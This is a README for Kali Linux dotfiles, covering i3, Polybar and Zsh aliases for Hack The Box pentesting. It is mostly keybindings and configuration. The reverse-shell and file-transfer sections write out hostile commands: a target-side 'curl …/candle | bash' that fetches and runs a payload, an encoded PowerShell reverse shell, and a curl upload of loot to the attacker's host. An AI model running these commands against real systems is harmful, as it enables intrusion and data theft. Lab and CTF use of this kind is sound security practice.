# dotfiles-kali

Kali Linux dotfiles for VMware -- i3wm + Polybar with a dark monochrome theme.

## Installation

```bash
git clone https://github.com/x-ser/dotfiles-kali.git
cd dotfiles-kali
chmod +x install.sh
./install.sh
```

The script handles everything in two phases:

1. **Package Installation** -- system packages, fonts, Rust/Python tooling, security tools
2. **Dotfiles Installation** -- copies configs, sets permissions, switches shell to Zsh

After installation, **reboot** or reload i3 with `Alt+Shift+R`.

### Post-install checklist

| Task | Path |
|------|------|
| Place wallpaper | `~/.config/i3/wallpaper/catgirl.jpg` |
| Place HTB `.ovpn` file | `~/htb/vpn/` |

---

## What's Included

### Desktop Environment

| Component | Tool | Config |
|-----------|------|--------|
| Window Manager | i3 | `config/i3/config` |
| Status Bar | Polybar | `config/polybar/config.ini` |
| Compositor | Picom | `config/picom/picom.conf` |
| Launcher | Rofi | `config/rofi/config.rasi` |
| Terminal | Terminator | `config/terminator/config` |
| File Manager | Thunar | `config/Thunar/uca.xml` |
| Shell | Zsh + Oh My Zsh + Starship | `.zshrc`, `config/starship/config.toml` |

---

## i3 Keybindings

Mod key = `Alt`

### Basics

| Key | Action |
|-----|--------|
| `Alt+Enter` | Open Terminator |
| `Alt+d` | Open Rofi (app launcher) |
| `Alt+Shift+Q` | Kill focused window |
| `Alt+Shift+/` | Toggle scratchpad terminal |

### Focus & Move

| Key | Action |
|-----|--------|
| `Alt+j/k/l/;` | Focus left/down/up/right |
| `Alt+Arrow keys` | Focus left/down/up/right |
| `Alt+Shift+j/k/l/;` | Move window left/down/up/right |
| `Alt+Shift+Arrow keys` | Move window left/down/up/right |

### Layout

| Key | Action |
|-----|--------|
| `Alt+h` | Split horizontal |
| `Alt+v` | Split vertical |
| `Alt+f` | Fullscreen toggle |
| `Alt+s` | Stacking layout |
| `Alt+w` | Tabbed layout |
| `Alt+e` | Toggle split layout |
| `Alt+Shift+Space` | Toggle floating |
| `Alt+Space` | Toggle focus (tiling/floating) |

### Workspaces

| Key | Action |
|-----|--------|
| `Alt+1..0` | Switch to workspace 1-10 |
| `Alt+Shift+1..0` | Move window to workspace 1-10 |

### i3 Control

| Key | Action |
|-----|--------|
| `Alt+r` | Enter resize mode (then `j/k/l/;` or arrows, `Esc` to exit) |
| `Alt+Shift+C` | Reload config |
| `Alt+Shift+R` | Restart i3 |
| `Alt+Shift+E` | Exit i3 |

---

## Shell Commands & Aliases

### General

| Alias | Description |
|-------|-------------|
| `myip` | Show tun0 IP (falls back to eth0) |
| `vpnip` | Show VPN (tun0) IP |
| `localip` | Show local (eth0) IP |
| `msfconsole` | Launch Metasploit (quiet mode) |
| `nse <keyword>` | Search Nmap scripts |

### Wordlists

| Alias | Path |
|-------|------|
| `rockyou` | `/usr/share/wordlists/rockyou.txt` |
| `seclists` | `/usr/share/seclists` |
| `wl-dir` | `dirbuster/directory-list-2.3-medium.txt` |
| `wl-dns` | `Discovery/DNS/subdomains-top1million-5000.txt` |
| `wl-user` | `Usernames/xato-net-10-million-usernames.txt` |

Use with other tools via command substitution:

```bash
ffuf -u http://target/FUZZ -w $(wl-dir)
gobuster dns -d target.htb -w $(wl-dns)
```

### Target Management

Target is shown in the Polybar center module.

| Command | Description |
|---------|-------------|
| `settarget <ip>` | Set current target (syncs with Polybar) |
| `cleartarget` | Clear target (resets to "None") |
| `target` | Print current target |

### HTB Workflow

**Create a new box workspace:**

```bash
newbox forest
# [+] Target set: forest
# [+] Workspace ready: /home/user/htb/forest
#
# Created structure:
#   ~/htb/forest/
#     nmap/
#     loot/
#     exploit/
#     notes/
#       README.md
```

**Connect to HTB VPN:**

```bash
# Place your .ovpn file in ~/htb/vpn/ first
vpn
# [*] Connecting: lab_user.ovpn
```

**Quick scanning (uses target from `settarget`):**

```bash
settarget 10.10.11.100

scan              # rustscan + nmap scripts (default: quick)
scan quick        # same as above
scan full         # nmap full port scan (-p- -sC -sV)
scan udp          # nmap top 50 UDP ports
```

Output goes to `./nmap/` if the directory exists (i.e., inside a `newbox` workspace), otherwise to the current directory.

### Reverse Shell Generator

Auto-detects tun0 IP (fallback eth0). Two modes:

**Linux** -- writes payload to `./candle`, host with `serve`, target curls it:

```bash
revshell bash          # Bash TCP
revshell py            # Python3
revshell nc            # Netcat mkfifo
revshell php           # PHP exec
revshell bash 4444     # Custom port (default: 9001)

# Workflow:
# 1. revshell bash       → writes ./candle
# 2. nc -lvnp 9001       → start listener
# 3. serve               → host the payload
# 4. Target: curl 10.10.14.x:8000/candle | bash
```

**Windows** -- base64-encoded PowerShell, auto-copied to clipboard:

```bash
revshell ps            # PowerShell base64 encoded
revshell ps 4444       # Custom port

# Output: powershell -e JABjAGwAaQBlAG4AdA...
# Just paste on target
```

### File Transfer

```bash
serve              # HTTP server on port 8000 (serves current dir)
serve 9090         # Custom port

upload             # Upload receiver on port 8001
upload 9091        # Custom port
# Target: curl -F 'file=@loot.zip' http://<ip>:8001/upload
```

### Archive Extractor

```bash
extract file.tar.gz       # Supports tar.gz, tar.xz, zip, 7z, rar, bz2, gz, xz
```

---

## Polybar Modules

| Module | Position | Description |
|--------|----------|-------------|
| xworkspaces | Left | Active workspaces |
| xwindow | Left | Focused window title (40 chars max) |
| target | Center | Current pentest target (from `settarget`) -- click to clear |
| disk | Right | Root partition usage % |
| memory | Right | RAM usage % |
| cpu | Right | CPU usage % |
| network-stat | Right | IP + RX/TX bytes (VPN if tun0 active, else ethernet) |
| date | Right | Clock (click to toggle full date) |

---

## Thunar Custom Actions

Right-click context menu in Thunar:

| Action | Description |
|--------|-------------|
| Open Terminator Here | Opens terminal in the current directory |
| Open VS Code Here | Opens VS Code in the current directory |
| Open as Root | Opens Thunar as root (for CTF/pentest file access) |
